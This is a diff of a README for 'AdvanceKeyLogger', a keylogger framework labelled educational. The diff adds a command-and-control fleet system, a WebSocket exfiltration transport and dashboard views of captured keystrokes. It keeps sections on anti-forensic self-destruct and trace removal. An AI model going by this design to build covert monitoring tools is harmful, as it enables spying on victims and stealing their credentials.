@@ -23,8 +23,9 @@ A modular Python input monitoring and screen capture tool built for **educationa
   - [Self-Destruct / Anti-Forensics](#11-self-destruct--anti-forensics)
   - [Auto-Install Dependencies](#12-auto-install-dependencies)
   - [Dashboard (Web UI)](#13-dashboard-web-ui)
-  - [Resilience Patterns](#14-resilience-patterns)
-  - [Process Management](#15-process-management)
+  - [Fleet Management](#14-fleet-management)
+  - [Resilience Patterns](#15-resilience-patterns)
+  - [Process Management](#16-process-management)
 - [Architecture](#architecture)
 - [Project Structure](#project-structure)
 - [Requirements](#requirements)
@@ -42,22 +43,22 @@ A modular Python input monitoring and screen capture tool built for **educationa
 | Category | Features |
 |----------|----------|
 | **Capture** | Keyboard, mouse, screenshot, clipboard, active window, audio recording |
-| **Transport** | Email (SMTP), HTTP (POST/PUT), FTP/FTPS, Telegram Bot API |
-| **Storage** | Local filesystem with rotation, SQLite with batch tracking |
-| **Security** | AES-256-CBC encryption, PBKDF2 key derivation, ZIP/GZIP compression |
+| **Transport** | Email (SMTP), HTTP (POST/PUT), FTP/FTPS, Telegram Bot API, WebSocket |
+| **Storage** | Local filesystem with rotation, SQLite with batch tracking, Fleet SQLite |
+| **Security** | AES-256-CBC, E2E (X25519 + AES-256-GCM), PBKDF2, RSA signature verification |
 | **Resilience** | Retry with exponential backoff, circuit breaker, transport queue |
 | **Pipeline** | Configurable middleware chain (dedup, rate-limit, enrich, route, truncate) |
 | **Rule Engine** | YAML-based conditional rules with pattern matching and actions |
-| **Biometrics** | Keystroke timing analysis, user profiling, profile matching |
+| **Biometrics** | Keystroke timing analysis, user profiling, authentication via typing patterns |
 | **Profiler** | App usage tracking, categorization, productivity scoring |
 | **Service** | Cross-platform daemon mode (systemd, launchd, Windows Service) |
+| **Fleet** | Distributed agent management, command dispatch, heartbeat monitoring |
+| **Dashboard** | FastAPI web UI with 8+ pages, WebSocket real-time updates, command palette |
 | **Anti-Forensics** | Self-destruct with secure wipe, trace removal, service cleanup |
 | **Auto-Install** | Automatic dependency detection and installation at startup |
-| **Dashboard** | FastAPI web UI with auth, analytics, screenshot viewer |
 | **Operations** | PID lock, graceful shutdown, rotating logs, dry-run mode |
-| **Architecture** | Plugin system with auto-discovery, YAML config with env var overrides |
+| **Architecture** | Plugin system with auto-discovery, EventBus pub/sub, YAML + env var config |
 | **Cross-platform** | Windows, Linux, macOS support |
-| **Testing** | 145 passing tests across unit and integration suites |
 
 ---
 
@@ -168,6 +169,12 @@ All transport modules inherit from [`BaseTransport`](transport/base.py) and self
 - **Source:** [`transport/telegram_transport.py`](transport/telegram_transport.py)
 - **Concepts:** REST API integration, message vs document upload based on size, bot validation
 
+#### WebSocket
+- **Source:** [`transport/websocket_transport.py`](transport/websocket_transport.py)
+- **Concepts:** Persistent bidirectional connection, auto-reconnect with backoff, heartbeat keep-alive, optional SSL/TLS, message compression
+- **Config:** `transport.websocket.url`, `reconnect_interval`, `heartbeat_interval`, `ssl`, `verify_ssl`
+- **Dependencies:** `websockets>=11.0` (optional — install with `pip install .[transports]`)
+
 ---
 
 ### 4. Storage Backends
@@ -180,6 +187,10 @@ All transport modules inherit from [`BaseTransport`](transport/base.py) and self
 - **Source:** [`storage/sqlite_storage.py`](storage/sqlite_storage.py)
 - **Concepts:** Structured storage with WAL mode, batch retrieval of unsent records, mark-as-sent tracking, purge old data
 - **Test:** [`tests/test_storage.py`](tests/test_storage.py)
+
+#### Fleet Storage
+- **Source:** [`storage/fleet_storage.py`](storage/fleet_storage.py)
+- **Concepts:** Dedicated SQLite database for fleet management — agent registry, command history, heartbeat logs, controller key persistence, enrollment key tracking
 
 ---
 
@@ -236,7 +247,7 @@ YAML-based conditional rules with pattern matching and triggered actions.
 
 ### 8. Keystroke Biometrics
 
-Analyzes typing patterns to build user profiles based on keystroke timing.
+Analyzes typing patterns to build user profiles based on keystroke timing. Optionally authenticates users by matching live typing against stored profiles.
 
 - **Source:** [`biometrics/`](biometrics/)
   - [`biometrics/collector.py`](biometrics/collector.py) — Timing data collection (dwell time, flight time)
@@ -244,7 +255,15 @@ Analyzes typing patterns to build user profiles based on keystroke timing.
   - [`biometrics/matcher.py`](biometrics/matcher.py) — Profile distance/similarity comparison
   - [`biometrics/models.py`](biometrics/models.py) — Data models
 - **Test:** [`tests/test_biometrics.py`](tests/test_biometrics.py)
-- **Concepts:** Dwell time (key hold duration), flight time (inter-key interval), statistical profiling, distance metrics
+- **Concepts:** Dwell time (key hold duration), flight time (inter-key interval), statistical profiling, distance metrics, user authentication via typing patterns
+- **Authentication config:**
+  ```yaml
+  biometrics:
+    authentication:
+      enabled: false
+      match_threshold: 50.0    # Distance threshold (lower = stricter)
+      min_samples: 100         # Min keystrokes for reliable matching
+  ```
 
 ---
 
@@ -339,19 +358,96 @@ Checks for missing Python packages at startup and optionally installs them via p
 
 ### 13. Dashboard (Web UI)
 
-A FastAPI-based web dashboard for monitoring captures, viewing screenshots, and analytics.
+A FastAPI-based web dashboard with 8+ pages, real-time WebSocket updates, command palette, and fleet management views.
 
 - **Source:** [`dashboard/`](dashboard/)
-  - [`dashboard/app.py`](dashboard/app.py) — FastAPI routes and API endpoints
-  - [`dashboard/auth.py`](dashboard/auth.py) — Session-based authentication
+  - [`dashboard/app.py`](dashboard/app.py) — FastAPI application factory with lifespan management
+  - [`dashboard/auth.py`](dashboard/auth.py) — Session-based authentication with JWT support
   - [`dashboard/run.py`](dashboard/run.py) — Dashboard server launcher
+  - **Routes:**
+    - [`dashboard/routes/pages.py`](dashboard/routes/pages.py) — HTML page routes (dashboard, analytics, captures, screenshots, settings, live, fleet)
+    - [`dashboard/routes/api.py`](dashboard/routes/api.py) — REST API endpoints for captures, screenshots, analytics
+    - [`dashboard/routes/fleet_api.py`](dashboard/routes/fleet_api.py) — Fleet management REST API (agent registration, heartbeat, commands)
+    - [`dashboard/routes/fleet_ui.py`](dashboard/routes/fleet_ui.py) — Fleet UI page routes
+    - [`dashboard/routes/fleet_dashboard_api.py`](dashboard/routes/fleet_dashboard_api.py) — Fleet dashboard data API
+    - [`dashboard/routes/websocket.py`](dashboard/routes/websocket.py) — WebSocket endpoint for real-time updates
+  - **Templates:** `base.html`, `dashboard.html`, `analytics.html`, `captures.html`, `screenshots.html`, `settings.html`, `live.html`, `login.html`, `landing.html`, `fleet/index.html`, `fleet/agent_details.html`
+  - **Frontend JS:**
+    - [`dashboard/static/js/ws-client.js`](dashboard/static/js/ws-client.js) — WebSocket client with auto-reconnect, LiveDashboard class for real-time event feed
+    - [`dashboard/static/js/cmd-palette.js`](dashboard/static/js/cmd-palette.js) — Command palette (Ctrl+K) for quick navigation
+    - [`dashboard/static/js/app.js`](dashboard/static/js/app.js), `dashboard.js`, `analytics.js`, `captures.js`, `screenshots.js`, `settings.js`
 - **Test:** [`tests/test_dashboard.py`](tests/test_dashboard.py)
-- **Concepts:** FastAPI, Jinja2 templates, session auth, REST API endpoints, path traversal protection
-- **Endpoints:** `/api/status`, `/api/captures`, `/api/screenshots`, `/api/analytics/activity`, `/api/analytics/summary`, `/api/config`, `/api/modules`
+- **Concepts:** FastAPI, Jinja2 templates, session auth, WebSocket real-time updates, path traversal protection, command palette UX
+- **Pages:**
+  | Page | URL | Description |
+  |------|-----|-------------|
+  | Dashboard | `/` | Overview with status cards and activity feed |
+  | Analytics | `/analytics` | Capture metrics, activity charts |
+  | Captures | `/captures` | Keystroke log viewer |
+  | Screenshots | `/screenshots` | Screenshot gallery with viewer |
+  | Settings | `/settings` | Configuration management |
+  | Live | `/live` | Real-time activity feed via WebSocket |
+  | Fleet | `/fleet` | Agent management, command dispatch |
+  | Agent Details | `/fleet/agents/{id}` | Individual agent status and command history |
+- **API Endpoints:**
+  | Endpoint | Description |
+  |----------|-------------|
+  | `GET /api/status` | System status |
+  | `GET /api/captures` | Recent captures |
+  | `GET /api/screenshots` | Screenshot list |
+  | `GET /api/analytics/activity` | Activity data |
+  | `GET /api/analytics/summary` | Analytics summary |
+  | `GET /api/config` | Current configuration |
+  | `GET /api/modules` | Module status |
+  | `POST /api/fleet/agents/register` | Agent registration |
+  | `POST /api/fleet/agents/{id}/heartbeat` | Agent heartbeat |
+  | `GET /api/fleet/agents/{id}/commands` | Poll pending commands |
+  | `POST /api/fleet/commands/{id}/response` | Command result |
+  | `WS /ws` | WebSocket for real-time dashboard updates |
 
 ---
 
-### 14. Resilience Patterns
+### 14. Fleet Management
+
+A distributed agent management system for controlling multiple instances from a central dashboard.
+
+- **Source:**
+  - [`agent_controller.py`](agent_controller.py) — Core Controller/Agent architecture with command dispatch, heartbeat monitoring, SecureChannel (RSA key pairs, signature verification)
+  - [`fleet/controller.py`](fleet/controller.py) — FleetController with SQLite persistence, key management
+  - [`fleet/agent.py`](fleet/agent.py) — FleetAgent with HTTP/WebSocket transport, auto-reconnect
+  - [`fleet/run_agent.py`](fleet/run_agent.py) — Agent entry point script
+  - [`fleet/auth.py`](fleet/auth.py) — JWT-based authentication for fleet communication
+  - [`storage/fleet_storage.py`](storage/fleet_storage.py) — Persistent storage for agents, commands, keys
+- **Concepts:** Distributed architecture, command-and-control pattern, RSA signature verification, JWT authentication, priority command queues, heartbeat-based health monitoring
+- **Config:**
+  ```yaml
+  fleet:
+    enabled: false
+    database_path: "./data/fleet.db"
+    agent:
+      controller_url: ""
+      heartbeat_interval: 60
+      reconnect_interval: 30
+      max_retries: 5
+      command_poll_interval: 5
+      sign_requests: false
+      transport_method: "http"    # "http" or "websocket"
+    controller:
+      max_agents: 1000
+      heartbeat_timeout: 120
+      max_command_history: 1000
+      cleanup_interval: 300
+    security:
+      require_signature_verification: true
+  ```
+- **Agent usage:**
+  ```bash
+  python -m fleet.run_agent --controller-url http://controller:8000
+  ```
+
+---
+
+### 15. Resilience Patterns
 
 - **Source:** [`utils/resilience.py`](utils/resilience.py)
 - **Test:** [`tests/test_utils.py`](tests/test_utils.py) (TestRetry, TestCircuitBreaker, TestTransportQueue classes)
@@ -362,7 +458,7 @@ A FastAPI-based web dashboard for monitoring captures, viewing screenshots, and 
 
 ---
 
-### 15. Process Management
+### 16. Process Management
 
 - **Source:** [`utils/process.py`](utils/process.py)
 - **Test:** [`tests/test_utils.py`](tests/test_utils.py) (TestPIDLock, TestGracefulShutdown classes)
@@ -388,34 +484,38 @@ A FastAPI-based web dashboard for monitoring captures, viewing screenshots, and 
 +-----------------+ +-----------------+ +-----------------+
 | keyboard        | | local FS        | | email (SMTP)    |
 | mouse           | | SQLite          | | HTTP            |
-| screenshot      | +-----------------+ | FTP/FTPS        |
-| clipboard       |                     | Telegram        |
-| window          | +-----------------+ +-----------------+
-| audio           | |   Pipeline      |
-+-----------------+ |   Middleware     | +-----------------+
-                    +-----------------+ |   Dashboard     |
-+-----------------+ | deduplicator    | |   (FastAPI)     |
-|   Rule Engine   | | rate_limiter    | +-----------------+
-|   (YAML rules)  | | router          |
-+-----------------+ | truncator       | +-----------------+
-                    | enricher        | |  Self-Destruct  |
-+-----------------+ +-----------------+ |  (anti-forensic)|
-|  Biometrics     |                     +-----------------+
-|  (typing)       | +-----------------+
-+-----------------+ |  App Profiler   | +-----------------+
-                    |  (productivity) | |  Auto-Install   |
-+-----------------+ +-----------------+ |  (dep checker)  |
+| screenshot      | | Fleet SQLite    | | FTP/FTPS        |
+| clipboard       | +-----------------+ | Telegram        |
+| window          |                     | WebSocket       |
+| audio           | +-----------------+ +-----------------+
++-----------------+ |   Pipeline      |
+                    |   Middleware     | +-----------------+
++-----------------+ +-----------------+ |   Dashboard     |
+|   Rule Engine   | | deduplicator    | |   (FastAPI)     |
+|   (YAML rules)  | | rate_limiter    | |   + WebSocket   |
++-----------------+ | router          | |   + Cmd Palette |
+                    | truncator       | +-----------------+
++-----------------+ | enricher        |
+|  Biometrics     | +-----------------+ +-----------------+
+|  (typing +      |                     |   Fleet Mgmt    |
+|   auth)         | +-----------------+ |  Controller +   |
++-----------------+ |  App Profiler   | |  Agent + Auth   |
+                    |  (productivity) | +-----------------+
++-----------------+ +-----------------+
 |   Service       |                     +-----------------+
-| systemd/launchd |
-| Windows Service | +-----------------+
-+-----------------+ |   Utilities     |
-                    | crypto | zip    |
+| systemd/launchd | +-----------------+ |  Self-Destruct  |
+| Windows Service | |   Utilities     | |  (anti-forensic)|
++-----------------+ | crypto | zip    | +-----------------+
                     | retry  | PID    |
-                    | logger | sysinfo|
-                    +-----------------+
++-----------------+ | logger | sysinfo| +-----------------+
+|   EventBus      | | event_bus       | |  Auto-Install   |
+|   (pub/sub)     | +-----------------+ |  (dep checker)  |
++-----------------+                     +-----------------+
 ```
 
 **Plugin System:** Capture and transport modules self-register via decorators (`@register_capture`, `@register_transport`). Modules are auto-imported at startup, and missing optional dependencies are handled gracefully.
+
+**Event System:** The [`EventBus`](engine/event_bus.py) provides decoupled pub/sub event routing between components (rule engine triggers, fleet events, pipeline notifications).
 
 ---
 
@@ -424,6 +524,8 @@ A FastAPI-based web dashboard for monitoring captures, viewing screenshots, and 
 ```
 AdvanceKeyLogger/
 ├── main.py                          # Entry point & orchestration loop
+├── agent_controller.py              # Core Controller/Agent architecture (fleet)
+├── pyproject.toml                   # Project metadata & dependencies
 ├── config/
 │   ├── settings.py                  # Settings singleton (YAML + env vars)
 │   └── default_config.yaml          # Default configuration
@@ -448,11 +550,19 @@ AdvanceKeyLogger/
 │   ├── email_transport.py           # SMTP with SSL/TLS
 │   ├── http_transport.py            # HTTP POST/PUT
 │   ├── ftp_transport.py             # FTP/FTPS upload
-│   └── telegram_transport.py        # Telegram Bot API
+│   ├── telegram_transport.py        # Telegram Bot API
+│   └── websocket_transport.py       # WebSocket with auto-reconnect
 ├── storage/
 │   ├── __init__.py
 │   ├── manager.py                   # Local filesystem with rotation
-│   └── sqlite_storage.py            # SQLite with batch tracking
+│   ├── sqlite_storage.py            # SQLite with batch tracking
+│   └── fleet_storage.py             # Fleet management SQLite storage
+├── fleet/
+│   ├── __init__.py
+│   ├── controller.py                # FleetController with persistence
+│   ├── agent.py                     # FleetAgent with HTTP/WS transport
+│   ├── run_agent.py                 # Agent entry point
+│   └── auth.py                      # JWT authentication for fleet
 ├── pipeline/
 │   ├── __init__.py
 │   ├── core.py                      # Pipeline orchestrator
@@ -487,12 +597,45 @@ AdvanceKeyLogger/
 │   └── windows_service.py           # Windows service management
 ├── dashboard/
 │   ├── __init__.py
-│   ├── app.py                       # FastAPI web dashboard
-│   ├── auth.py                      # Session-based auth
-│   └── run.py                       # Dashboard launcher
+│   ├── app.py                       # FastAPI application factory
+│   ├── auth.py                      # Session-based auth + JWT
+│   ├── run.py                       # Dashboard launcher
+│   ├── routes/
+│   │   ├── pages.py                 # HTML page routes
+│   │   ├── api.py                   # REST API endpoints
+│   │   ├── fleet_api.py             # Fleet management API
+│   │   ├── fleet_ui.py              # Fleet UI pages
+│   │   ├── fleet_dashboard_api.py   # Fleet dashboard data API
+│   │   └── websocket.py             # WebSocket endpoint
+│   ├── templates/
+│   │   ├── base.html                # Base layout template
+│   │   ├── dashboard.html           # Main dashboard
+│   │   ├── analytics.html           # Analytics page
+│   │   ├── captures.html            # Capture log viewer
+│   │   ├── screenshots.html         # Screenshot gallery
+│   │   ├── settings.html            # Settings management
+│   │   ├── live.html                # Real-time activity feed
+│   │   ├── login.html               # Login page
+│   │   ├── landing.html             # Landing page
+│   │   └── fleet/
+│   │       ├── index.html           # Fleet management page
+│   │       └── agent_details.html   # Agent details page
+│   └── static/
+│       ├── css/style.css            # Dashboard styling
+│       └── js/
+│           ├── app.js               # Common application logic
+│           ├── dashboard.js         # Dashboard page logic
+│           ├── analytics.js         # Analytics charts
+│           ├── captures.js          # Captures viewer
+│           ├── screenshots.js       # Screenshot gallery
+│           ├── settings.js          # Settings page
+│           ├── ws-client.js         # WebSocket client (real-time)
+│           └── cmd-palette.js       # Command palette (Ctrl+K)
+├── server/
+│   └── run.py                       # E2E collector server
 ├── utils/
 │   ├── __init__.py
-│   ├── crypto.py                    # AES-256-CBC encryption
+│   ├── crypto.py                    # AES-256-CBC / E2E encryption
 │   ├── compression.py               # ZIP and GZIP compression
 │   ├── resilience.py                # Retry, circuit breaker, queue
 │   ├── process.py                   # PID lock & graceful shutdown
@@ -538,21 +681,27 @@ AdvanceKeyLogger/
 | `pynput` | >= 1.7.6 | Keyboard and mouse input listeners |
 | `Pillow` | >= 10.0.0 | Screenshot capture |
 | `pyyaml` | >= 6.0 | YAML configuration parsing |
+| `cryptography` | >= 41.0.0 | AES-256 encryption, RSA keys |
+| `pyperclip` | >= 1.8.2 | Clipboard monitoring |
+| `requests` | >= 2.31.0 | HTTP transport, fleet agent |
+| `fastapi` | >= 0.104.0 | Dashboard web UI |
+| `uvicorn[standard]` | >= 0.24.0 | ASGI server |
+| `jinja2` | >= 3.1.0 | HTML templates |
+| `python-multipart` | >= 0.0.6 | Form data parsing |
+| `psutil` | >= 5.9.0 | System metrics |
+| `PyJWT` | >= 2.8.0 | JWT authentication |
 
 **Optional dependencies:**
 
-| Package | Version | Purpose |
-|---------|---------|---------|
-| `cryptography` | >= 41.0.0 | AES-256 encryption |
-| `pyperclip` | >= 1.8.2 | Clipboard monitoring |
-| `requests` | >= 2.31.0 | HTTP and Telegram transports |
-| `sounddevice` | >= 0.4.6 | Audio recording |
-| `numpy` | >= 1.24.0 | Audio data handling |
-| `psutil` | >= 5.9.0 | System metrics |
-| `pyobjc-framework-Quartz` | >= 10.0 | Native macOS capture: keyboard, mouse, screenshot, window (macOS only) |
-| `pyobjc-framework-Cocoa` | >= 10.0 | Native macOS capture: clipboard, window (macOS only) |
-| `pyobjc-framework-AVFoundation` | >= 10.0 | Native macOS audio capture (macOS only) |
-| `fastapi` | >= 0.104.0 | Dashboard web UI |
+| Package | Version | Purpose | Install with |
+|---------|---------|---------|--------------|
+| `redis` | >= 5.0.0 | Redis transport | `pip install .[transports]` |
+| `websockets` | >= 11.0 | WebSocket transport | `pip install .[transports]` |
+| `sounddevice` | >= 0.4.6 | Audio recording | manual |
+| `numpy` | >= 1.24.0 | Audio data handling | manual |
+| `pyobjc-framework-Quartz` | >= 10.0 | Native macOS capture (macOS only) | manual |
+| `pyobjc-framework-Cocoa` | >= 10.0 | Native macOS clipboard/window (macOS only) | manual |
+| `pyobjc-framework-AVFoundation` | >= 10.0 | Native macOS audio (macOS only) | manual |
 
 **Platform-specific:**
 
@@ -576,8 +725,17 @@ python -m venv venv
 source venv/bin/activate        # Linux/macOS
 # venv\Scripts\activate         # Windows
 
-# Install dependencies
-pip install -r requirements.txt
+# Install core dependencies
+pip install -e .
+
+# Install with optional transports (Redis, WebSocket)
+pip install -e ".[transports]"
+
+# Install with dev tools (pytest, ruff, mypy)
+pip install -e ".[dev]"
+
+# Install everything
+pip install -e ".[all,dev]"
 ```
 
 ---
@@ -646,7 +804,7 @@ storage:
   sqlite_path: "./data/captures.db"
 ```
 
-**Transport** (choose one method):
+**Transport** (choose one method: `email`, `http`, `ftp`, `telegram`, `websocket`):
 ```yaml
 transport:
   method: "email"
@@ -654,6 +812,13 @@ transport:
   queue_size: 1000
   failure_threshold: 5
   cooldown: 60
+
+  websocket:
+    url: ""
+    reconnect_interval: 5
+    heartbeat_interval: 30
+    ssl: false
+    verify_ssl: true
 ```
 
 **Encryption & compression:**
@@ -723,6 +888,7 @@ python main.py --log-level DEBUG
 | `--no-pid-lock` | Allow multiple instances (skip PID lock) |
 | `--version` | Show version and exit |
 | `service <action>` | Manage daemon mode (install/uninstall/start/stop/restart/status) |
+| `dashboard` | Launch the web dashboard (default port 8050) |
 
 ### List available plugins
 
@@ -742,6 +908,7 @@ Registered transport plugins:
   - ftp
   - http
   - telegram
+  - websocket
 ```
 
 ### Dry-run mode
